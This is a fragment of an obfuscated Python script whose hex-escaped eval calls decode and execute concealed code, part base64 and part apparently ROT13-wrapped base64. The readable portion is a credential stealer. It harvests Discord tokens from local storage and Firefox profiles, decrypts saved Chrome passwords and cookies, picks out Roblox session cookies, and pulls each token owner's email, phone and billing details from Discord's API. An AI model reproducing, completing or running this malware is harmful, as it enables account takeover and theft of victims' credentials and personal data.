god = 'xpbmVzKCkgaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHJlZ2V4IGluIChzZWxmLnJlZ2V4KToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiBmaW5kYWxsKHJlZ2V4LCBsaW5lKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhc3luY2lvLnJ1bihzZWxmLmNoZWNrVG9rZW4odG9rZW4pKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoc2VsZi5yb2FtaW5nKydcXGRpc2NvcmRcXExvY2FsIFN0YXRlJyk6CiAgICAgICAgICAgICAgICAgICAgZm9yIGZpbGVfbmFtZSBpbiBvcy5saXN0ZGlyKHBhdGgpOgogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgZmlsZV9uYW1lLmVuZHN3aXRoKCcubG9nJykgYW5kIG5vdCBmaWxlX25hbWUuZW5kc3dpdGgoJy5sZGInKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBsaW5lIGluIFt4LnN0cmlwKCkgZm9yIHggaW4gb3BlbihmJ3twYXRofVxce2ZpbGVfbmFtZX0nLCBlcnJvcnM9J2lnbm9yZScpLnJlYWRsaW5lcygpIGlmIHguc3RyaXAoKV06CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgeSBpbiBmaW5kYWxsKHNlbGYuZW5jcnlwdGVkX3JlZ2V4LCBsaW5lKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b2tlbiA9IHNlbGYuZGVjcnlwdF92YWwoYjY0ZGVjb2RlKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB5LnNwbGl0KCdkUXc0dzlXZ1hjUTonKVsxXSksIHNlbGYuZ2V0X21hc3Rlcl9rZXkoc2VsZi5yb2FtaW5nKydcXGRpc2NvcmRcXExvY2FsIFN0YXRlJykpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXN5bmNpby5ydW4oc2VsZi5jaGVja1Rva2VuKHRva2VuKSkKCiAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoc2VsZi5yb2FtaW5nKyJcXE1vemlsbGFcXEZpcmVmb3hcXFByb2ZpbGVzIik6CiAgICAgICAgICAgIGZvciBwYXRoLCBfLCBmaWxlcyBpbiBvcy53YWxrKHNlbGYucm9hbWluZysiXFxNb3ppbGxhXFxGaXJlZm94XFxQcm9maWxlcyIpOgogICAgICAgICAgICAgICAgZm9yIF9maWxlIGluIGZpbGVzOgogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBfZmlsZS5lbmRzd2l0aCgnLnNxbGl0ZScpOgogICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgICAgIGZvciBsaW5lIGluIFt4LnN0cmlwKCkgZm9yIHggaW4gb3BlbihmJ3twYXRofVxce19maWxlfScsIGVycm9ycz0naWdub3JlJykucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHJlZ2V4IGluIChzZWxmLnJlZ2V4KToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiBmaW5kYWxsKHJlZ2V4LCBsaW5lKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhc3luY2lvLnJ1bihzZWxmLmNoZWNrVG9rZW4odG9rZW4pKQoKICAgIEB0cnlfZXh0cmFjdAogICAgZGVmIGdyYWJQYXNzd29yZChzZWxmKToKICAgICAgICBtYXN0ZXJfa2V5ID0gc2VsZi5nZXRfbWFzdGVyX2tleSgKICAgICAgICAgICAgc2VsZi5hcHBkYXRhKydcXEdvb2dsZVxcQ2hyb21lXFxVc2VyIERhdGFcXExvY2FsIFN0YXRlJykKICAgICAgICBsb2dpbl9kYiA9IHNlbGYuYXBwZGF0YSsnXFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhXFxkZWZhdWx0XFxMb2dpbiBEYXRhJwogICAgICAgIGxvZ2luID0gc2VsZi50ZW1wK3NlbGYuc2VwKyJMb2dpbnZhdWx0MS5kYiIKCiAgICAgICAgc2h1dGlsLmNvcHkyKGxvZ2luX2RiLCBsb2dpbikKICAgICAgICBjb25uID0gc3FsaXRlMy5jb25uZWN0KGxvZ2luKQogICAgICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkKICAgICAgICB3aXRoIG9wZW4oc2VsZi5kaXIrIlxcR29vZ2xlIFBhc3N3b3Jkcy50eHQiLCAidyIsIGVuY29kaW5nPSJjcDQzNyIsIGVycm9ycz0naWdub3JlJykgYXMgZjoKICAgICAgICAgICAgY3Vyc29yLmV4ZWN1dGUoCiAgICAgICAgICAgICAgICAiU0VMRUNUIGFjdGlvbl91cmwsIHVzZXJuYW1lX3ZhbHVlLCBwYXNzd29yZF92YWx1ZSBGUk9NIGxvZ2lucyIpCiAgICAgICAgICAgIGZvciByIGluIGN1cnNvci5mZXRjaGFsbCgpOgogICAgICAgICAgICAgICAgdXJsID0gclswXQogICAgICAgICAgICAgICAgdXNlcm5hbWUgPSByWzFdCiAgICAgICAgICAgICAgICBlbmNyeXB0ZWRfcGFzc3dvcmQgPSByWzJdCiAgICAgICAgICAgICAgICBkZWNyeXB0ZWRfcGFzc3dvcmQgPSBzZWxmLmRlY3J5cHRfdmFsKAogICAgICAgICAgICAgICAgICAgIGVuY3J5cHRlZF9wYXNzd29yZCwgbWFzdGVyX2tleSkKICAgICAgICAgICAgICAgIGlmIHVybCAhPSAiIjoKICAgICAgICAgICAgICAgICAgICBmLndyaXRlKAogICAgICAgICAgICAgICAgICAgICAgICBmIkRvbWFpbjoge3VybH1cblVzZXI6IHt1c2VybmFtZX1cblBhc3M6IHtkZWNyeXB0ZWRfcGFzc3dvcmR9XG5cbiIpCiAgICAgICAgY3Vyc29yLmNsb3NlKCkKICAgICAgICBjb25uLmNsb3NlKCkKICAgICAgICBvcy5yZW1vdmUobG9naW4pCgogICAgQHRyeV9leHRyYWN0CiAgICBkZWYgZ3JhYkNvb2tpZXMoc2VsZik6CiAgICAgICAgbWFzdGVyX2tleSA9IHNlbGYuZ2V0X21hc3Rlcl9rZXkoCiAgICAgICAgICAgIHNlbGYuYXBwZGF0YSsnXFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhXFxMb2NhbCBTdGF0ZScpCiAgICAgICAgbG9naW5fZGIgPSBzZWxmLmFwcGRhdGErJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcZGVmYXVsdFxcTmV0d29ya1xcY29va2llcycKICAgICAgICBsb2dpbiA9IHNlbGYudGVtcCtzZWxmLnNlcCsiTG9naW52YXVsdDIuZGIiCiAgICAgICAgc2h1dGlsLmNvcHkyKGxvZ2luX2RiLCBsb2dpbikKICAgICAgICBjb25uID0gc3FsaXRlMy5jb25uZWN0KGxvZ2luKQogICAgICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkKICAgICAgICB3aXRoIG9wZW4oc2VsZi5kaXIrIlxcR29vZ2xlIENvb2tpZXMudHh0IiwgInciLCBlbmNvZGluZz0iY3A0MzciLCBlcnJvcnM9J2lnbm9yZScpIGFzIGY6CiAgICAgICAgICAgIGN1cnNvci5leGVjdXRlKAogICAgICAgICAgICAgICAgIlNFTEVDVCBob3N0X2tleSwgbmFtZSwgZW5jcnlwdGVkX3ZhbHVlIGZyb20gY29va2llcyIpCiAgICAgICAgICAgIGZvciByIGluIGN1cnNvci5mZXRjaGFsbCgpOgogICAgICAgICAgICAgICAgaG9zdCA9IHJbMF0KICAgICAgICAgICAgICAgIHVzZXIgPSByWzFdCiAgICAgICAgICAgICAgICBkZWNyeXB0ZWRfY29va2llID0gc2VsZi5kZWNyeXB0X3ZhbChyWzJdLCBtYXN0ZXJfa2V5KQogICAgICAgICAgICAgICAgaWYgaG9zdCAhPSAiIjoKICAgICAgICAgICAgICAgICAgICBmLndyaXRlKAogICAgICAgICAgICAgICAgICAgICAgICBmIkhvc3Q6IHtob3N0fVxuVXNlcjoge3VzZXJ9XG5Db29raWU6IHtkZWNyeXB0ZWRfY29va2llfVxuXG4iKQogICAgICAgICAgICAgICAgaWYgJ198V0FSTklORzotRE8tTk9ULVNIQVJFLVRISVMuLS1TaGFyaW5nLXRoaXMtd2lsbC1hbGxvdy1zb21lb25lLXRvLWxvZy1pbi1hcy15b3UtYW5kLXRvLXN0ZWFsLXlvdXItUk9CVVgtYW5kLWl0ZW1zLnxfJyBpbiBkZWNyeXB0ZWRfY29va2llOgogICAgICAgICAgICAgICAgICAgIHNlbGYucm9ibG94Y29va2llcy5hcHBlbmQoZGVjcnlwdGVkX2Nvb2tpZSkKICAgICAgICBjdXJzb3IuY2xvc2UoKQogICAgICAgIGNvbm4uY2xvc2UoKQogICAgICAgIG9zLnJlbW92ZShsb2dpbikKCiAgICBkZWYgbmVhdGlmeVRva2VucyhzZWxmKToKICAgICAgICBmID0gb3BlbihzZWxmLmRpcisiXFxEaXNjb3JkIEluZm8udHh0IiwKICAgICAgICAgICAgICAgICAidyIsIGVuY29kaW5nPSJjcDQzNyIsIGVycm9ycz0naWdub3JlJykKICAgICAgICBmb3IgdG9rZW4gaW4gc2VsZi50b2tlbnM6CiAgICAgICAgICAgIGogPSBodHRweC5nZXQoCiAgICAgICAgICAgICAgICBzZWxmLmJhc2V1cmwsIGhlYWRlcnM9c2VsZi5nZXRIZWFkZXJzKHRva2VuKSkuanNvbigpCiAgICAgICAgICAgIHVzZXIgPSBqLmdldCgndXNlcm5hbWUnKSArICcjJyArIHN0cihqLmdldCgiZGlzY3JpbWluYXRvciIpKQoKICAgICAgICAgICAgYmFkZ2VzID0gIiIKICAgICAgICAgICAgZmxhZ3MgPSBqWydmbGFncyddCiAgICAgICAgICAgIGZsYWdzID0galsnZmxhZ3MnXQogICAgICAgICAgICBpZiAoZmxhZ3MgPT0gMSk6CiAgICAgICAgICAgICAgICBiYWRnZXMgKz0gIlN0YWZmLCAiCiAgICAgICAgICAgIGlmIChmbGFncyA9PSAyKToKICAgICAgICAgICAgICAgIGJhZGdlcyArPSAiUGFydG5lciwgIgogICAgICAgICAgICBpZiAoZmxhZ3MgPT0gNCk6CiAgICAgICAgICAgICAgICBiYWRnZXMgKz0gIkh5cGVzcXVhZCBFdmVudCwgIgogICAgICAgICAgICBpZiAoZmxhZ3MgPT0gOCk6CiAgICAgICAgICAgICAgICBiYWRnZXMgKz0gIkdyZWVuIEJ1Z2h1bnRlciwgIgogICAgICAgICAgICBpZiAoZmxhZ3MgPT0gNjQpOgogICAgICAgICAgICAgICAgYmFkZ2VzICs9ICJIeXBlc3F1YWQgQnJhdmVyeSwgIgogICAgICAgICAgICBpZiAoZmxhZ3MgPT0gMTI4KToKICAgICAgICAgICAgICAgIGJhZGdlcyArPSAiSHlwZVNxdWFkIEJyaWxsYW5jZSwgIgogICAgICAgICAgICBpZiAoZmxhZ3MgPT0gMjU2KToKICAgICAgICAgICAgICAgIGJhZGdlcyArPSAiSHlwZVNxdWFkIEJhbGFuY2UsICIKICAgICAgICAgICAgaWYgKGZsYWdzID09IDUxMik6CiAgICAgICAgICAgICAgICBiYWRnZXMgKz0gIkVhcmx5IFN1cHBvcnRlciwgIgogICAgICAgICAgICBpZiAoZmxhZ3MgPT0gMTYzODQpOgogICAgICAgICAgICAgICAgYmFkZ2VzICs9ICJHb2xkIEJ1Z0h1bnRlciwgIgogICAgICAgICAgICBpZiAoZmxhZ3MgPT0gMTMxMDcyKToKICAgICAgICAgICAgICAgIGJhZGdlcyArPSAiVmVyaWZpZWQgQm90IERldmVsb3BlciwgIgogICAgICAgICAgICBpZiAoYmFkZ2VzID09ICIiKToKICAgICAgICAgICAgICAgIGJhZGdlcyA9ICJOb25lIgogICAgICAgICAgICBlbWFpbCA9IGouZ2V0KCJlbWFpbCIpCiAgICAgICAgICAgIHBob25lID0gai5nZXQoInBob25lIikgaWYgai5nZXQoCiAgICAgICAgICAgICAgICAicGhvbmUiKSBlbHNlICJObyBQaG9uZSBOdW1iZXIgYXR0YWNoZWQiCiAgICAgICAgICAgIG5pdHJvX2RhdGEgPSBodHRweC5nZXQoCiAgICAgICAgICAgICAgICBzZWxmLmJhc2V1cmwrJy9iaWxsaW5nL3N1YnNjcmlwdGlvbnMnLCBoZWFkZXJzPXNlbGYuZ2V0SGVhZGVycyh0b2tlbikpLmpzb24oKQogICAgICAgICAgICBoYXNfbml0cm8gPSBGYWxzZQogICAgICAgICAgICBoYXNfbml0cm8gPSBib29sKGxlbihuaXRyb19kYXRhKSA+IDApCiAgICAgICAgICAgIGJpbGxpbmcgPSBib29sKGxlbihqc29uLmxvYWRzKGh0dHB4LmdldCgKICAgICAgICAgICAgICAgIHNlbGYuYmFzZXVybCsiL2JpbGxpbmcvcGF5bWVudC1zb3VyY2VzIiwgaGVhZGVycz1zZWxmLmdldEhlYWRlcnModG9rZW4pKS50ZXh0KSkgPiAwKQogICAgICAgICAgICBmLndyaXRlKGYieycgJyoxN317dXNlcn1cbnsnLScqNTB9XG5Ub2tlbjoge3Rva2VufVxuSGFzIEJpbGxpbmc6IHtiaWxsaW5nfVxuTml0cm86IHtoYXNfbml0cm99XG5CYWRnZXM6IHtiYWRnZXN9XG5FbWFpbDoge2VtYWlsfVxuUGhvbmU6IHtwaG9uZX1cblxuIikKICAgICAgICBmLmNsb3NlKCkKCiAgICBkZWYgZ3JhYlJvYmxveENvb2tpZShzZWxmKToKICAgICAgICBkZWYgc3VicHJvYyhwYXRoKToKICAgICAgICAgICAgdHJ'
destiny = '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co25qXUgao29aoTIgLKO9XFpfPvNtVPNtVPNtVPNtVPNtVPNtVPNtW2McMJkxplp6VSfXVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtrjbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtW25uoJHaBvNaKUHlZQOvWljXVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPq2LJk1MFp6VTLaWlqtLTOznKtXVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOWHQeubV7vtX97nKO9PvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtG3WaBhTtwhXNe3gipzq9PvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtD2y0rGeubV7vtX97L2y0rK0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOFMJqco2464nPB4bPir3WyM2yioa0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOQo3IhqUW5BhTtwhXNe3gwo3IhqUW5sJOtLNbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtWlpaYaWypTkuL2HbWlNaYPNaWlxfPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNanJ5fnJ5yWmbtIUW1MDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPO9YNbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPO7PvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNaozSgMFp6VPqpqGVjZTVaYNbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtW3MuoUIyWmbtMvpaW2OtLTMcrNbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVSOQGzSgMGevtX97o3ZhM2I0MJ52XPqQG01DIIESHx5OGHHaXK0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOKnJ5YMKx64nPB4bPir3qeMKy9PvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtHTkuqTMipz064nPB4bPir3qhLJ1ysDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVREcp2gGpTSwMGeubV7vtX97MTymn31UDtbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVSWuoGeubV7vtX97pzSgsHqPLTOtPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNaWlphpzIjoTSwMFtaVPpfVPpaXFjXVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPqcozkcozHaBvOHpaIyPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVU0fPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUfXVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPqhLJ1yWmbtWlbdIT9eMJ5mBvbdWljXVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPq2LJk1MFp6VTLaWlqtLTO5LJ1fPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtr3Ein2IhplOcMvO0o2gyoaZtMJkmMFNvGz8tqT9eMJ5mVTI4qUWuL3EyMPW9LTOtVNbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtWlpaYaWypTkuL2HbWlNaYPNaWlxfPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNanJ5fnJ5yWmbtEzSfp2HXVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtsFjXVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtrjbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtW25uoJHaBvOznJkyD291oaDfPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNaqzSfqJHaBvOzWlpaLTOtnJ5cPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtJjbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUgznJkyp19zo3IhMP5mqUWcpPtcsDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVS1tLTNXVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPpaWl5lMKOfLJAyXPptWljtWlpcYNbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtW2yhoTyhMFp6VRMuoUAyPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVU0XVPNtVPNtVPNtVPNtVPNtVPNtVPOqYNbtVPNtVPNtVPNtVPNtVPNtVPNtVPqzo290MKVaBvO7PvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPq0MKu0WmbtW0ElnKc6oTImVQRjZTftE3WuLzWypvpXVPNtVPNtVPNtVPNtVPNtVPNtVPO9PvNtVPNtVPNtVPNtVPNtVPO9PvNtVPNtVPNtVPNtVS0XVPNtVPNtVPO9PvNtVPNtVPNtnUE0pUthpT9mqPumMJkzYaqyLzuio2ffVTcmo249MJ1vMJDcPvNtVPNtVPNtq2y0nPOipTIhXS96nKOznJkyYPNapzVaXFOuplOzBtbtVPNtVPNtVPNtVPObqUEjrP5jo3A0XUAyoTLhq2IvnT9inljtMzyfMKZ9rlq1pTkiLJEsMzyfMFp6VTM9XDbtVPNtVPNtVT9mYaWyoJ92MFusrzyjMzyfMFxXPtccMvOsK25uoJIsKlN9CFNvK19gLJyhK18vVTShMPOipl5hLJ1yVQ09VPWhqPV6PvNtVPOup3yhL2yiYaW1ovuVLKcupzEsIT9eMJ5sE3WuLzWypy9JZvtcYzyhnKDbXFxX'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
